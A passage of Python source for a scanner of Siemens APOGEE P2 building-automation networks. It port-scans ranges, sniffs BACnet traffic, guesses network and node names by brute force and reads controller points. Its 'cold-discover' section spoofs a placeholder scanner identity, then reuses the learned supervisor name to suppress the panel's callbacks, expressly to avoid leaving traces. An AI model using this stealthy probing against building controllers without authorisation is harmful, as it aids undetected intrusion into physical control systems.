                    after_flags = msg_data[flags_idx + 3:]
                    if len(after_flags) >= 8:
                        raw_val = after_flags[4:8]
                        app_num = int(struct.unpack('>f', raw_val)[0])
                        desc = ''
                        lp_strings = P2Connection._extract_lp_strings(msg_data[12:flags_idx])
                        routing_set = {P2_NETWORK, SCANNER_NAME, P2_SITE,
                                      node_name.upper(), node_name.lower()}
                        data_strs = [st for st in lp_strings if st not in routing_set
                                   and st.upper() != 'APPLICATION']
                        if len(data_strs) >= 2:
                            desc = data_strs[1]
                        found.append({
                            'device': dev_name,
                            'application': app_num,
                            'description': desc,
                        })
                        sys.stdout.write(f"\r    \u2713 {dev_name:<20s}  APP={app_num}  {desc}\n")
                        sys.stdout.flush()
                else:
                    # Fallback: device responded but different format (UC, PTEC, etc)
                    # Extract description from any length-prefixed strings
                    lp_strings = P2Connection._extract_lp_strings(msg_data[12:])
                    routing_set = {P2_NETWORK, SCANNER_NAME, P2_SITE,
                                  node_name.upper(), node_name.lower(), 'APPLICATION'}
                    data_strs = [st for st in lp_strings if st not in routing_set
                               and st != dev_name]
                    desc = data_strs[0] if data_strs else ''
                    found.append({
                        'device': dev_name,
                        'application': 0,
                        'description': desc,
                    })
                    sys.stdout.write(f"\r    \u2713 {dev_name:<20s}  (non-TEC)  {desc}\n")
                    sys.stdout.flush()

    finally:
        s.close()
    sys.stdout.write(f"\r    Device scan complete: {len(found)} TECs found{'':30s}\n")
    return found

def discover_panel_points(host: str, node_name: str) -> List[Dict]:
    """Try reading known panel-level points from a node."""
    conn = P2Connection(host, network=P2_NETWORK if P2_NETWORK else "P2NET", scanner_name=SCANNER_NAME)
    if not conn.connect(node_name.lower()):
        return []

    found = []
    total = len(PANEL_POINT_NAMES)

    for i, pt_name in enumerate(PANEL_POINT_NAMES):
        sys.stdout.write(f"\r    Panel points: {i+1}/{total} — {pt_name:<30s}")
        sys.stdout.flush()

        # Panel points use the point name as both device and point
        result = conn.read_point(pt_name, pt_name, node_name.lower())
        if result and result.get('value') is not None:
            found.append({
                'point': pt_name,
                'value': result['value'],
                'units': result.get('units', ''),
            })

        time.sleep(0.03)

    conn.close()
    sys.stdout.write(f"\r    Panel point scan complete: {len(found)} points found{'':30s}\n")
    return found


def discover_network(ip_ranges: str = "192.0.2", scan_ports: bool = True,
                     scan_devices: bool = True, scan_panel: bool = False,
                     scan_info: bool = False, verify: str = None,
                     read_all: bool = False, output_format: str = "table",
                     read_points: Optional[List[str]] = None,
                     inter_read_delay_s: float = 0.05):
    """
    Full network discovery:
    1. Port scan for P2 hosts (or use known nodes)
    2. Handshake each to learn node names
    3. Brute-force TEC device discovery on each node
    4. Optionally read all points on every discovered device (read_all=True)
       OR read specific points across all devices (read_points=["ROOM TEMP"])
    """
    print(f"\n{'═' * 70}")
    print(f"  P2 NETWORK DISCOVERY")
    print(f"{'═' * 70}")

    # Step 1: Find P2 hosts
    if scan_ports:
        ip_list = parse_ip_range(ip_ranges)
        print(f"\n  [1/3] Port scanning {len(ip_list)} IPs for TCP/{P2_PORT}...")
        print(f"        Range: {ip_ranges}")
        hosts = port_scan_p2(ip_list)
    else:
        print(f"\n  [1/3] Using known node list ({len(KNOWN_NODES)} nodes)")
        hosts = list(KNOWN_NODES.values())

    if not hosts:
        print("  No P2 hosts found.")
        return

    # Auto-learn the P2 network name if not already known
    if not P2_NETWORK:
        print(f"\n  Auto-learning P2 network name...")
        learned = learn_network_name(hosts)
        if learned:
            print(f"  Learned network: {learned}")
        else:
            print(f"\n  ⚠ Could not auto-learn the P2 network name.")
            print(f"    PXC controllers require the correct network name to respond.")
            print(f"    Use --network <NAME> to specify it.")
            print(f"    Find it in your BAS front-end (often listed under Field Networks).")
            print(f"    Common formats: SITEBLN, SITEEBLN, SITE_BLN")
            print(f"\n    Example: p2_scanner.py --discover --range {ip_ranges} --network MYBLN")
            return

    # Step 2: Identify each node
    print(f"\n  [2/3] Identifying {len(hosts)} P2 nodes...")
    print(f"        (trying common node names — this may take a moment)")
    node_map = {}  # ip -> node_name
    for ip in hosts:
        # Check known_nodes first (from config file)
        known_name = None
        for kname, kip in KNOWN_NODES.items():
            if kip == ip:
                known_name = kname
                break
        if known_name:
            node_map[ip] = known_name
            print(f"    {ip}... {known_name}  (from config)")
            continue

        sys.stdout.write(f"    {ip}... probing ")
        sys.stdout.flush()
        info = probe_p2_host(ip)
        if info and 'node_name' in info:
            node_map[ip] = info['node_name']
            KNOWN_NODES[info['node_name']] = ip
            extras = []
            if info.get('network'):
                extras.append(f"net={info['network']}")
            if info.get('site'):
                extras.append(f"site={info['site']}")
            extra_str = f"  ({', '.join(extras)})" if extras else ""
            sys.stdout.write(f"\r    {ip}... {info['node_name']}{extra_str}{'':20s}\n")
            sys.stdout.flush()
        else:
            sys.stdout.write(f"\r    {ip}... not a PXC (DCC server or unresponsive){'':20s}\n")
            sys.stdout.flush()
            node_map[ip] = f"UNKNOWN_{ip.split('.')[-1]}"

    if P2_NETWORK:
        print(f"\n  P2 Network: {P2_NETWORK}  |  Site: {P2_SITE or '?'}")

    # Step 3: Discover devices on each node
    all_devices = {}
    if scan_devices:
        # Filter to only identified nodes (skip UNKNOWN — those are servers, not PXCs)
        pxc_nodes = {ip: name for ip, name in node_map.items()
                     if not name.startswith('UNKNOWN')}
        skipped = len(node_map) - len(pxc_nodes)
        if skipped:
            print(f"\n  Skipping {skipped} unidentified hosts (likely DCC servers)")
        print(f"\n  [3/3] Discovering TEC devices on {len(pxc_nodes)} PXC nodes...")

        for ip, name in sorted(pxc_nodes.items(), key=lambda x: x[1]):
            print(f"\n  {'─' * 60}")
            print(f"  {name} ({ip})", end="")

            # Get node firmware info if requested
            if scan_info:
                info = get_node_info(ip, name)
                if info:
                    print(f"  — {info['firmware']} / {info['model']}", end="")
                    all_devices.setdefault(name, {})['node_info'] = info

            print(f"\n  {'─' * 60}")

            devs = discover_devices_on_node(ip, name)
            all_devices[name] = {'ip': ip, 'devices': devs}

            # Verify online status if requested
            if verify and devs:
                verify_devices(ip, name, devs, show_filter=verify)

            if scan_panel:
                print(f"    Scanning panel-level points...")
                panel_pts = discover_panel_points(ip, name)
                all_devices[name]['panel_points'] = panel_pts
                if panel_pts:
                    for pt in panel_pts[:10]:
                        val = pt['value']
                        units = pt.get('units', '')
                        print(f"      {pt['point']:<35s} = {val:>10.2f} {units}")
                    if len(panel_pts) > 10:
                        print(f"      ... and {len(panel_pts) - 10} more")

    # Step 4: Optionally read all points on discovered devices
    if read_all and all_devices:
        print(f"\n{'═' * 70}")
        print(f"  READING ALL POINTS ON DISCOVERED DEVICES")
        print(f"{'═' * 70}")

        for name in sorted(all_devices.keys()):
            node_info = all_devices[name]
            ip = node_info['ip']
            devs = node_info['devices']

            for dev_info in devs:
                dev = dev_info['device']
                app = dev_info.get('application', 2023)
                desc = dev_info.get('description', '')

                app_label = format_app_label(app, prefix="[APP ") + "]"
                print(f"\n  {'━' * 60}")
                print(f"  {name} / {dev}", end="")
                if desc:
                    print(f"  ({desc})", end="")
                print(f"  {app_label}")
                print(f"  {'━' * 60}")

                results = scan_device(ip, dev, quick=False, output_format=output_format,
                                       inter_read_delay_s=inter_read_delay_s)
                all_devices[name].setdefault('point_data', {})[dev] = results

    # Step 4b: Selective point read across every discovered device.
    # This is the "quick building health check" mode — read specific points
    # (by name or slot number) from every device without doing a full scan.
    # Output is a single combined table sorted by node/device.
    elif read_points and all_devices:
        print(f"\n{'═' * 70}")
        print(f"  BUILDING-WIDE READ — points: {', '.join(str(p) for p in read_points)}")
        print(f"{'═' * 70}")

        sweep_results = []  # flat list: one entry per (node, device, point)
        total_devs = sum(len(ni['devices']) for ni in all_devices.values())
        done = 0

        for name in sorted(all_devices.keys()):
            node_info = all_devices[name]
            ip = node_info['ip']
            devs = node_info['devices']

            for dev_info in devs:
                dev = dev_info['device']
                desc = dev_info.get('description', '')
                done += 1
                sys.stdout.write(f"\r  Reading {done}/{total_devs} — {name}/{dev}           ")
                sys.stdout.flush()

                try:
                    # output_format="none" suppresses per-device tables; we'll
                    # render a single combined table at the end.
                    dev_results = scan_device(ip, dev, points=list(read_points),
                                              output_format="none",
                                              inter_read_delay_s=inter_read_delay_s)
                except ScannerInputError as e:
                    # Bad input stops the whole sweep — the user gave us a
                    # slot/name that's invalid. Fail fast, same contract as
                    # single-device scans.
                    print(f"\n  [ERROR] {e}")
                    return
                except Exception as e:
                    # Per-device exceptions (timeouts, auth) are logged and
                    # skipped so one bad device doesn't kill the sweep.
                    sweep_results.append({'node': name, 'device': dev,
                                          'description': desc, 'error': str(e)})
                    continue

                if dev_results:
                    for r in dev_results:
                        r['_node'] = name
                        r['_device'] = dev
                        r['_description'] = desc
                        sweep_results.append(r)
                else:
                    # Device unreachable or point not readable — record the miss
                    sweep_results.append({'node': name, 'device': dev,
                                          'description': desc,
                                          'error': 'no data'})

        # Clear progress line
        sys.stdout.write("\r" + " " * 70 + "\r")

        # Render combined output
        _print_sweep_results(sweep_results, read_points, output_format)

    # Summary
    print(f"\n{'═' * 70}")
    print(f"  DISCOVERY RESULTS")
    print(f"{'═' * 70}")

    print(f"\n  P2 NODES:")
    for name in sorted(all_devices.keys()):
        info = all_devices[name]
        devs = info.get('devices', [])
        dev_count = len(devs)
        panel_count = len(info.get('panel_points', []))
        # Count online/offline if verified
        online = sum(1 for d in devs if d.get('status') == 'online')
        offline = sum(1 for d in devs if d.get('status') == 'offline')
        extra_parts = []
        if panel_count:
            extra_parts.append(f"{panel_count} panel points")
        if online or offline:
            extra_parts.append(f"{online} online, {offline} offline")
        extra = f"  ({', '.join(extra_parts)})" if extra_parts else ""
        print(f"    {name:<12s}  {info['ip']:<16s}  {dev_count} devices{extra}")

    total_devs = 0
    total_online = 0
    total_offline = 0
    for name in sorted(all_devices.keys()):
        devs = all_devices[name].get('devices', [])
        if devs:
            # Don't re-print device list if verify already printed it
            if not verify:
                print(f"\n  {name} DEVICES:")
                for d in devs:
                    desc = d.get('description', '')
                    desc_str = f"  ({desc})" if desc else ""
                    app_label = format_app_label(d['application'])
                    print(f"    {d['device']:<20s}  {app_label}{desc_str}")
            total_devs += len(devs)
            total_online += sum(1 for d in devs if d.get('status') == 'online')
            total_offline += sum(1 for d in devs if d.get('status') == 'offline')

    summary = f"\n  TOTAL: {len(node_map)} nodes, {total_devs} devices discovered"
    if total_online or total_offline:
        summary += f" ({total_online} online, {total_offline} offline)"
    print(summary)
    print(f"{'═' * 70}")

    # JSON output
    if output_format == "json":
        print(json.dumps(all_devices, indent=2, default=str))


# ═══════════════════════════════════════════════════════════════════════════════
# Cold-site onboarding — discover BLN/scanner/node names on an unknown site.
#
# Pure addition to the original scanner — does NOT modify any existing code
# paths. Builds its own heartbeats independently via _cold_probe(), uses the
# existing port_scan_p2() helper, and populates KNOWN_NODES at the end via
# direct dict mutation (which save_config respects).
#
# Empirically validated: PXCs validate (BLN name, scanner name, node name)
# on handshake; wrong BLN → TCP RST; wrong scanner/node → silent drop;
# site and trailer fields are decorative.
# ═══════════════════════════════════════════════════════════════════════════════

_COLD_VENDOR_OUIS = {
    '00:c0:e4': 'Siemens Building Technologies',
    '00:a0:03': 'Siemens AG Automation',
    '00:12:ea': 'Trane',
    '00:50:db': 'Contemporary Controls',
    '00:50:7f': 'Distech Controls',
}
_COLD_SIEMENS_OUIS = {o for o, v in _COLD_VENDOR_OUIS.items() if 'Siemens' in v}
_COLD_BACNET_PORT = 47808
_COLD_FALSE_POSITIVE_PREFIXES = {
    'RM', 'VAV', 'AHU', 'FAN', 'FLR', 'CAB', 'BACNET',
    'DEVICE', 'ROOT', 'SYS', 'OBJECT', 'NET', 'SITE',
    'NODE', 'PANEL', 'ETHER', 'BVLC',
}


def _cold_extract_strings(data: bytes, min_len: int = 4) -> List[str]:
    results, cur = [], []
    for b in data:
        if 32 <= b < 127:
            cur.append(chr(b))
        else:
            if len(cur) >= min_len:
                results.append(''.join(cur))
            cur = []
    if len(cur) >= min_len:
        results.append(''.join(cur))
    return results


def _cold_get_arp_mac(ip: str) -> Optional[str]:
    import subprocess
    try:
        if sys.platform.startswith('win'):
            result = subprocess.run(['arp', '-a', ip], capture_output=True,
                                    text=True, timeout=3)
        else:
            result = subprocess.run(['arp', '-n', ip], capture_output=True,
                                    text=True, timeout=3)
        for line in result.stdout.splitlines():
            if ip in line:
                m = re.search(r'([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}', line)
                if m:
                    return m.group(0).replace('-', ':').lower()
    except Exception:
        pass
    return None


def _cold_classify_vendor(mac: Optional[str]) -> str:
    if not mac:
        return 'Unknown (no MAC)'
    return _COLD_VENDOR_OUIS.get(mac[:8].lower(), f'Unknown OUI {mac[:8]}')


def _cold_passive_bacnet(duration: int = 30, interface: str = '0.0.0.0',
                         verbose: bool = False) -> Dict[str, dict]:
    from collections import defaultdict
    print(f"\n{'─' * 70}")
    print(f"  COLD-DISCOVER PHASE 1: Passive BACnet recon ({duration}s)")
    print(f"{'─' * 70}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    try:
        sock.bind((interface, _COLD_BACNET_PORT))
    except OSError as e:
        print(f"  [FAIL] Could not bind UDP/{_COLD_BACNET_PORT}: {e}")
        sock.close()
        return {}

    discoveries: Dict[str, dict] = defaultdict(
        lambda: {'strings': set(), 'packet_count': 0, 'first_seen': None}
    )
    start = time.time()
    try:
        while time.time() - start < duration:
            sock.settimeout(1.0)
            try:
                data, (src, _) = sock.recvfrom(4096)
            except socket.timeout:
                continue
            if len(data) < 4 or data[0] != 0x81:
                continue
            d = discoveries[src]
            if d['first_seen'] is None:
                d['first_seen'] = time.time()
                if verbose:
                    print(f"  new BACnet source: {src}")
            d['packet_count'] += 1
            for s in _cold_extract_strings(data, min_len=4):
                d['strings'].add(s)
    except KeyboardInterrupt:
        print(f"  Interrupted.")
    finally:
        sock.close()
    print(f"  Captured from {len(discoveries)} unique BACnet source(s)")
    return dict(discoveries)


def _cold_infer_prefix(discoveries: Dict[str, dict]) -> List[str]:
    from collections import Counter
    scores: Counter = Counter()
    for info in discoveries.values():
        for s in info['strings']:
            if len(s) < 3 or s.lower() in ('bacnet', 'utf-8'):
                continue
            m = re.match(r'^([A-Za-z]{2,10})[_\-]', s)
            if m: scores[m.group(1).upper()] += 2
            m = re.match(r'^([A-Za-z]{3,8})\d', s)
            if m: scores[m.group(1).upper()] += 1
            m = re.match(r'^([A-Z][a-z]*[A-Z]+)', s)
            if m: scores[m.group(1).upper()] += 1
    ranked = [(p, c) for p, c in scores.most_common()
              if p not in _COLD_FALSE_POSITIVE_PREFIXES]
    if not ranked:
        return []
    top_score = ranked[0][1]
    return [p for p, c in ranked if c == top_score]


def _cold_generate_bln_candidates(prefixes: List[str]) -> List[str]:
    patterns = ["{p}EBLN", "{p}BLN", "{p}_BLN", "{p}-BLN",
                "{p}_EBLN", "{p}-EBLN", "{p}", "{p}NET"]
    candidates = []
    for pat in patterns:
        for p in [x.upper() for x in prefixes]:
            candidates.append(pat.format(p=p))
    candidates.extend(["APOGEE", "APOGEEBLN", "SIEMENS", "MAIN",
                       "DEFAULT", "NETWORK", "BLN1", "P2NET"])
    seen, result = set(), []
    for c in candidates:
        if c and c not in seen:
            seen.add(c); result.append(c)
    return result


def _cold_generate_scanner_candidates(prefixes: List[str]) -> List[str]:
    patterns = [
        "{p}DCC-SVR|5033", "{p}DCC-SVR",
        "{p}-DCC-SVR|5033", "{p}-DCC-SVR",
        "{p}DCC|5033", "{p}DCC",
    ]
    candidates = []
    for pat in patterns:
        for p in [x.upper() for x in prefixes]:
            candidates.append(pat.format(p=p))
    candidates.extend([
        "DCC-SVR|5033", "DCC-SVR",
        "INSIGHT-SVR", "INSIGHT",
        "DESIGO-CC", "DESIGO", "DESIGOCC", "APOGEE-SVR",
    ])
    seen, result = set(), []
    for c in candidates:
        if c and c not in seen:
            seen.add(c); result.append(c)
    return result


def _cold_generate_node_candidates(limit: int = 10) -> List[str]:
    candidates = []
    for i in range(1, limit + 1):
        candidates.append(f"node{i}")
        candidates.append(f"NODE{i}")
    candidates.extend(["MAIN", "LOBBY", "PENT", "BOILER", "CHILLER"])
    seen, result = set(), []
    for c in candidates:
        if c not in seen:
            seen.add(c); result.append(c)
    return result


def _cold_probe(host: str, bln: str, scanner: str, node: str,
                site: str = 'DIAGSITE', timeout: float = 3.0) -> Dict:
    """Independent heartbeat probe — builds its own frame, doesn't touch
    any module globals or the P2Connection class."""
    bln_b = bln.encode('ascii')
    scanner_b = scanner.encode('ascii')
    site_b = site.encode('ascii')
    node_b = node.encode('ascii')

    routing = (b'\x00' + bln_b + b'\x00' + node_b + b'\x00' +
               bln_b + b'\x00' + scanner_b + b'\x00')
    identity = (
        b'\x46\x40' +
        b'\x01' + struct.pack('>H', len(scanner_b)) + scanner_b +
        b'\x01' + struct.pack('>H', len(site_b)) + site_b +
        b'\x01' + struct.pack('>H', len(bln_b)) + bln_b +
        # Trailer: separator + 3 flags + 5 reserved + 4-byte timestamp +
        # 2-byte session id (00 00 = panel-style) + trailing null = 16 bytes.
        # See APOGEE_P2_SPEC.md §9 for the documented format.
        b'\x00\x01\x01\x00\x00\x00\x00\x00\x00' +
        struct.pack('>I', int(time.time())) + b'\x00\x00\x00'
    )
    payload = routing + identity
    frame = struct.pack('>III', 12 + len(payload), 0x33, secrets.randbits(24)) + payload

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, P2_PORT))
    except (ConnectionRefusedError, socket.timeout):
        return {'verdict': 'port_closed'}
    except Exception as e:
        return {'verdict': 'error', 'reason': str(e)}

    try:
        sock.sendall(frame)
    except Exception as e:
        sock.close()
        return {'verdict': 'error', 'reason': str(e)}

    sock.settimeout(2.0)
    data, reset = b"", False
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk: break
            data += chunk
            sock.settimeout(0.5)
    except ConnectionResetError:
        reset = True
    except Exception:
        pass
    finally:
        try: sock.close()
        except Exception: pass

    if data:
        return {'verdict': 'got_response', 'data': data}
    return {'verdict': 'rejected_rst' if reset else 'rejected_silent'}


# ─────────────────────────────────────────────────────────────────────
# Optimized cold-discovery primitive
#
# The panel's IdentifyBlock response (91 bytes) and SysInfoCompact
# response (281 bytes) both echo the panel's configured BLN, site code,
# and panel name in their TLV block, regardless of what the request
# claimed in those fields. Combined with the observation that a 15-
# character placeholder is accepted in slot 4 by the panel's bouncer,
# this reduces cold-discovery from a 3-dimensional Cartesian sweep
# (BLN × scanner × node) to a 2-dimensional sweep (BLN × node).
#
# Tradeoff: a placeholder scanner identity is treated as a new peer by
# the panel, which generates outbound callbacks at ~16s cadence to the
# requesting IP. To avoid those callbacks on subsequent probes, the
# optimized flow learns the canonical supervisor identity from the
# first successful response and uses that identity in slot 4 for all
# later probes. The panel treats a second session claiming the same
# identity as a parallel session and does not re-bind the supervisor
# IP, which suppresses the callbacks because the original supervisor
# IP remains the bound destination.
# ─────────────────────────────────────────────────────────────────────

WILDCARD_15CHAR_PLACEHOLDER = "RANDOM15CHARSXY"


def _parse_handshake_response(data: bytes) -> Optional[Dict]:
    """Parse a panel's IdentifyBlock response to extract canonical names.

    Empirically-verified response wire format (legacy-firmware PXC,
    derived from packet-capture analysis of the actual 91-byte response):

        [4B length BE] [4B msg_type=0x33/0x34] [4B seq] [01=success]
        [slot1 BLN \\0] [slot2 DEST \\0] [slot3 BLN \\0] [slot4 SOURCE \\0]
        [TLV: panel name] [TLV: site code] [TLV: BLN] [trailer]

    Response slot 4 is the panel itself (the source). Response slot 2 is
    the DEST = whoever the requester claimed to be in REQUEST slot 4.
    That means slot 2 of the response is the requester's claimed
    identity ECHOED BACK, NOT the panel's real supervisor canonical
    name. **The real supervisor canonical name is NOT in this response.**

    To learn the real supervisor name, use _cold_status_query_probe
    (opcode 0x0050 — already implemented elsewhere in this module) or
    sniff the supervisor port (default TCP/5033) for panel→supervisor callbacks.

    The TLV block echoes the panel's REAL configured site code, panel
    name, and BLN. The supervisor's canonical name is NOT in this
    response — it appears in the 0x0050 StatusQuery response instead.

    Returns dict with:
        bln                       — real BLN (from slot 1)
        panel_name                — real panel name (from slot 4)
        site                      — real site code (from TLV)
        claimed_supervisor_echo   — what the requester claimed to be
                                    (slot 2 echoed back; NOT the real
                                    supervisor canonical name)

    Returns None if the response doesn't match the expected shape.
    """
    if len(data) < 50:
        return None
    if data[12] not in (0x00, 0x01):  # request or success-response
        return None

    body = data[13:]
    fields = body.split(b'\x00', 4)
    if len(fields) < 5:
        return None

    bln1, claimed_sup_b, bln2, panel_name_b, rest = fields[:5]
    if bln1 != bln2 or not bln1:
        return None

    # TLV block follows the routing slots. In the response there is NO
    # explicit 0x4640 marker before the TLVs (request frames include it;
    # responses observed without). Walk TLVs to find the site code.
    site = None
    pos = 0
    # Tolerate an optional leading 0x4640 marker for robustness
    if rest[:2] == b'\x46\x40':
        pos = 2
    while pos + 3 < len(rest):
        if rest[pos] != 0x01 or rest[pos+1] != 0x00:
            break
        length = rest[pos+2]
        if pos + 3 + length > len(rest):
            break
        tlv_value = rest[pos+3:pos+3+length].rstrip(b'\x00')
        # Site code is typically the shortest distinct TLV string
        # (3-5 chars), differs from panel name, BLN, and claimed
        # supervisor echo.
        if (2 <= len(tlv_value) <= 10
                and tlv_value != panel_name_b
                and tlv_value != bln1
                and tlv_value != claimed_sup_b):
            site = tlv_value
            break
        pos += 3 + length

    def _safe_decode(b):
        try:
            return b.decode('ascii') if b else None
        except UnicodeDecodeError:
            return None

    return {
        'bln': _safe_decode(bln1),
        'site': _safe_decode(site) if site else None,
        'panel_name': _safe_decode(panel_name_b),
        'claimed_supervisor_echo': _safe_decode(claimed_sup_b),
        # NOTE: real supervisor_name is intentionally NOT returned here.
        # Use _cold_status_query_probe (opcode 0x0050) to learn it.
    }


def _cold_placeholder_probe(host: str, bln: str, node: str,
                    scanner_name: str = WILDCARD_15CHAR_PLACEHOLDER,
                    site: str = 'DIAGSITE',
                    timeout: float = 3.0) -> Dict:
    """Cold-probe using a 15-character ASCII placeholder for slot 4.
    Wraps `_cold_probe` with a known-accepting scanner identity,
    reducing the Cartesian search dimension from 3D to 2D (BLN × node).

    First-call note: a placeholder scanner identity triggers outbound
    callbacks at ~16 s cadence from the panel. Subsequent probes
    should use the learned supervisor canonical name as `scanner_name`
    to activate the panel's parallel-session-no-rebind protection,
    which suppresses callbacks silently.
    """
    if scanner_name == WILDCARD_15CHAR_PLACEHOLDER and len(scanner_name) != 15:
        raise ValueError(
            f"WILDCARD_15CHAR_PLACEHOLDER must be exactly 15 chars; got {len(scanner_name)}"
        )
    return _cold_probe(host, bln, scanner_name, node, site=site, timeout=timeout)


def cold_discover_v0_14(host: str,
                        bln_candidates: List[str],
                        node_candidates: List[str],
                        delay: float = 1.0,
                        verbose: bool = True,
                        chain_status_query: bool = True) -> Optional[Dict]:
    """Optimized two-stage cold-discovery primitive.

    Stage 1 — placeholder-wildcard handshake (this function's main loop):
        Probes BLN × node combinations until one is accepted. Parses
        the 91-byte IdentifyBlock response for real BLN, panel name,
        and site code. Reduces the search space from
        O(BLN × scanner × node) to O(BLN × node).

        Note: this stage does NOT learn the real supervisor canonical
        name — the response's slot 2 is the requester's claimed
        identity echoed back, not the panel's configured supervisor.

    Stage 2 — 0x0050 StatusQuery (chain_status_query=True, default):
        Calls _cold_status_query_probe with the learned BLN+panel and
        a permissive scanner identity. Per APOGEE_P2_SPEC.md §22.6 the
        0x0050 response includes the real supervisor canonical name
        in the body after the SYST scope footer. This is the existing
        scanner primitive — `cold_discover_v0_14` simply chains to it.

    Returns dict with:
        host, bln, site, panel_name,
        claimed_supervisor_echo,  — from Stage 1 (slot-2 echo)
        supervisor_name,          — from Stage 2 (real, if chain_status_query=True)
        first_probe_combo         — BLN, node pair that hit Stage 1
        status_query_msg_type     — present if Stage 2 succeeded

    or None if Stage 1 found no acceptance.

    Stage 2 failure is non-fatal: the function still returns the
    Stage 1 result without supervisor_name (caller can decide).

    Use the returned supervisor_name as scanner_name in subsequent
    probes (via _cold_probe / cold_discover_silent_sysinfo) to avoid
    additional outbound-callback traces — the panel's parallel-session
    protection suppresses callbacks when the second session claims
    the active supervisor identity.
    """
    if verbose:
        print(f"  cold_discover_v0_14 Stage 1: probing {host} "
              f"({len(bln_candidates)} BLN × {len(node_candidates)} node = "
              f"{len(bln_candidates) * len(node_candidates)} max probes)")

    discovery: Optional[Dict] = None
    for bln in bln_candidates:
        if discovery:
            break
        for node in node_candidates:
            r = _cold_placeholder_probe(host, bln, node, timeout=3.0)
            v = r['verdict']
            if v == 'got_response':
                parsed = _parse_handshake_response(r['data'])
                if parsed and parsed.get('bln') and parsed.get('panel_name'):
                    discovery = {
                        'host': host,
                        'first_probe_combo': {'bln': bln, 'node': node},
                        **parsed,
                    }
                    if verbose:
                        print(f"    HIT bln={bln!r} node={node!r}")
                        print(f"      -> real bln              = {parsed.get('bln')!r}")
                        print(f"      -> real panel name       = {parsed.get('panel_name')!r}")
                        print(f"      -> real site code        = {parsed.get('site')!r}")
                        print(f"      -> claimed supervisor    = "
                              f"{parsed.get('claimed_supervisor_echo')!r}  "
                              f"(this is the placeholder echoed back, NOT real)")
                    break
            elif v == 'port_closed':
                if verbose:
                    print(f"    {host}: port closed - aborting")
                return None
            time.sleep(delay)

    if not discovery:
        if verbose:
            print(f"  cold_discover_v0_14 Stage 1: no acceptance found across "
                  f"{len(bln_candidates) * len(node_candidates)} combos")
        return None

    if not chain_status_query:
        return discovery

    # Stage 2 — 0x0050 StatusQuery for real supervisor canonical name
    if verbose:
        print(f"  cold_discover_v0_14 Stage 2: 0x0050 StatusQuery for supervisor name")

    sq = _cold_status_query_probe(
        host,
        scanner_name=WILDCARD_15CHAR_PLACEHOLDER,
        bln_hint=discovery['bln'],
        panel_hint=discovery['panel_name'],
        timeout=3.0,
    )
    if sq:
        sup_bare = sq.get('supervisor')
        discovery['supervisor_name'] = sup_bare
        discovery['status_query_msg_type'] = sq.get('msg_type')

        # The 0x0050 StatusQuery returns the BARE form of the supervisor
        # name (e.g. "SITEDCC-SVR" without the port suffix). The
        # active-session-bound identity that Desigo CC uses on the wire
        # is the PORT-SUFFIXED form (e.g. "SITEDCC-SVR|5033"). Using
        # the bare form in slot 4 of a follow-up probe is typically
        # silent-dropped or rejected with a 0x05 error; the port-
        # suffixed form is accepted as a parallel session and does
        # not generate callbacks.
        #
        # Heuristic: if the bare form doesn't already contain |, append
        # the conventional Desigo CC port |5033. The caller can override
        # by providing supervisor_name_with_port directly. Some sites
        # use non-standard ports — if |5033 doesn't get the silent
        # parallel-session accept, the active port can be discovered by
        # sniffing supervisor-port callbacks or by the 0x464D topology query.
        if sup_bare and '|' not in sup_bare:
            discovery['supervisor_name_with_port'] = f"{sup_bare}|5033"
        else:
            discovery['supervisor_name_with_port'] = sup_bare

        if verbose:
            print(f"    HIT 0x0050 StatusQuery")
            print(f"      -> real supervisor name (bare)         = {sup_bare!r}")
            print(f"      -> canonical form (with default |5033) = "
                  f"{discovery['supervisor_name_with_port']!r}")
            print(f"         (use this form in slot 4 of follow-up probes for")
            print(f"          silent parallel-session accept)")
    else:
        if verbose:
            print(f"    0x0050 StatusQuery did not return supervisor name")
            print(f"    (panel may be on strict-peer-list firmware; falling back to "
                  f"passive supervisor-port sniff or manual lookup)")

    return discovery


def cold_discover_silent_sysinfo(host: str, discovery: Dict,
                                 timeout: float = 3.0) -> Optional[bytes]:
    """Follow-up 0x010C sysinfo probe using the learned supervisor name
    in slot 4. Silent (no callbacks) because the panel treats the
    second session as a parallel session and does not rebind the
    supervisor IP.

    Returns the raw response bytes (typically ~281 B) or None.
    Use _parse_handshake_response on the result to extract panel-side
    canonical names; sysinfo also returns model / firmware / build-date
    inline (decoded by the standard sysinfo helpers).

    Prefers `supervisor_name_with_port` from the discovery dict over
    `supervisor_name`. The bare form returned by 0x0050 StatusQuery is
    NOT the active-session-bound identity — using it in slot 4 typically
    causes silent-drop or a 0x05 rejection. The port-suffixed form
    (e.g. `<bare>|5033`) is what Desigo CC uses for the active session
    and is what the parallel-session protection covers.
    """
    bln = discovery.get('bln')
    panel_name = discovery.get('panel_name')
    # Prefer port-suffixed form (active-session-bound); fall back to bare
    supervisor_name = (discovery.get('supervisor_name_with_port')
                       or discovery.get('supervisor_name'))
    site = discovery.get('site') or 'DIAGSITE'

    if not all([bln, panel_name, supervisor_name]):
        return None

    bln_b = bln.encode('ascii')
    sv_b = supervisor_name.encode('ascii')
    site_b = site.encode('ascii')
    node_b = panel_name.lower().encode('ascii')

    routing = (b'\x00' + bln_b + b'\x00' + node_b + b'\x00' +
               bln_b + b'\x00' + sv_b + b'\x00')
    body = b'\x01\x0C'   # 0x010C SysInfoCompact request, empty body
    payload = routing + body
    frame = struct.pack('>III', 12 + len(payload), 0x33,
                        secrets.randbits(24)) + payload

    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, P2_PORT))
        sock.sendall(frame)
        sock.settimeout(2.0)
        data = b''
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
            sock.settimeout(0.5)
        return data if data else None
    except Exception:
        return None
    finally:
        if sock is not None:
            try:
                sock.close()
            except Exception:
                pass


def _cold_status_query_probe(host: str, scanner_name: str,
                             bln_hint: str = "", panel_hint: str = "",
                             timeout: float = 3.0
                             ) -> Optional[Dict[str, Any]]:
    """`0x0050` StatusQuery one-round-trip bootstrap (APOGEE_P2_SPEC.md §22.6).

